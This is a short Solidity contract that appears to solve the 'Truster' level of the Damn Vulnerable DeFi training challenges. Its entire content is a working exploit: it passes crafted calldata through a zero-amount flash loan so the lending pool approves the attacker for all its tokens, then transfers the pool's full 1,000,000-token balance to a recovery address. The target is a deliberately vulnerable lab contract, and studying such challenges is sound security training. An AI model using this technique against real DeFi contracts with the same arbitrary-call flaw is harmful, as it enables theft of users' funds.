// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract Hack {
    TrusterLenderPool public immutable pool;
    DamnValuableToken public immutable token;
    address recovery;
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(
        TrusterLenderPool _pool,
        DamnValuableToken _token,
        address _recovery
    ) {
        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        bytes memory data = abi.encodeCall(
            token.approve,
            (address(this), TOKENS_IN_POOL)
        );
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}
